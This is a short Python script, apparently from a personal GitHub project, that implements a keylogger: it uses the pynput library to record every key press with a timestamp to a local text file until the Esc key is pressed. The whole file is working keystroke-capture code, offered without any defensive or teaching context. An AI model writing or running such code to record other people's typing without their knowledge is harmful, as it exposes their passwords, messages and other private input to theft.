from pynput.keyboard import Key,Listener
import logging

logging.basicConfig(filename="C:/Users/KIIT/Downloads/Github/Keylogger/key_log.txt",filemode='a',
                    level=logging.DEBUG,format='%(asctime)s:%(message)s:',datefmt='%m/%d/%Y %I:%M:%S%p')

def on_press(key):
    try:
        logging.info(str(key))
        if key==Key.esc:
            return False #(stop listening)
    except Exception as e:
        pass

with Listener(on_press=on_press) as listener:
    listener.join()
